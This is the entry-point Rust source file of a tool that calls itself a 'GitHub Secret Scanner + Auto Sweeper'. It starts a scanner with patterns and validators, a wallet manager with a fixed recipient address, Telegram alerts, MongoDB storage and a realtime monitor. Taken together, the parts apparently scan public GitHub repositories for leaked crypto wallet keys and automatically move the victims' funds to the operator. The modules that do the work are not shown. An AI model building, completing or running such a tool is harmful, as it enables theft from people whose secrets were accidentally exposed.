mod config;
mod core;
mod scanner;
mod patterns;
mod validators;
mod wallet;
mod telegram;
mod database;
mod monitor;
mod models;

use std::sync::Arc;
use tracing::{info, warn, error};
use dotenv::dotenv;

#[global_allocator]
static ALLOC: jemallocator::Jemalloc = jemallocator::Jemalloc;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Load environment variables
    dotenv().ok();
    
    // Initialize logging
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .with_target(false)
        .with_file(true)
        .with_line_number(true)
        .init();

    info!("🚀 Starting GitHub Secret Scanner + Auto Sweeper...");
    
    // Load configuration
    let config = config::Config::from_env()?;
    let config = Arc::new(config);
    
    info!("✅ Configuration loaded");
    info!("📡 Poll interval: {} seconds", config.poll_interval_secs);
    info!("👛 Recipient address: {}", config.recipient_address);
    
    // Initialize cache
    let cache = core::cache::CacheManager::new();
    
    // Initialize database
    let db = match database::mongo::MongoDB::new(
        &config.mongodb_uri,
        &config.mongodb_db,
    ).await {
        Ok(db) => {
            info!("✅ MongoDB connected");
            db
        }
        Err(e) => {
            error!("❌ MongoDB connection failed: {}", e);
            return Err(e);
        }
    };
    
    let db_ops = Arc::new(database::ops::DatabaseOps::new(db.clone()));
    
    // Initialize wallet manager
    let wallet_manager = match wallet::manager::WalletManager::new(config.clone()) {
        Ok(wm) => {
            info!("✅ Wallet manager initialized");
            Arc::new(wm)
        }
        Err(e) => {
            error!("❌ Wallet manager initialization failed: {}", e);
            return Err(e);
        }
    };
    
    // Initialize telegram alerts
    let telegram = match telegram::alerts::TelegramAlerts::new(config.clone()) {
        Ok(ta) => {
            info!("✅ Telegram alerts initialized");
            Arc::new(ta)
        }
        Err(e) => {
            error!("❌ Telegram initialization failed: {}", e);
            return Err(e);
        }
    };
    
    // Initialize scan engine
    let scan_engine = scanner::engine::ScanEngine::new(
        config.clone(),
        cache.clone(),
    );
    
    info!("🔧 Starting scan engine...");
    
    // Start scan engine
    let scan_handle = tokio::spawn(async move {
        scan_engine.run().await;
    });
    
    // Initialize realtime monitor
    let monitor = monitor::realtime::RealtimeMonitor::new(
        config.clone(),
        db_ops.clone(),
        telegram.clone(),
        wallet_manager.clone(),
    );
    
    info!("🔄 Starting realtime monitor...");
    
    // Start monitor
    let monitor_handle = tokio::spawn(async move {
        monitor.run().await;
    });
    
    info!("✅ All systems running. Press Ctrl+C to stop.");
    
    // Wait for shutdown signal
    tokio::signal::ctrl_c().await?;
    warn!("🛑 Shutting down...");
    
    // Abort tasks
    scan_handle.abort();
    monitor_handle.abort();
    
    info!("👋 Goodbye!");
    
    Ok(())
}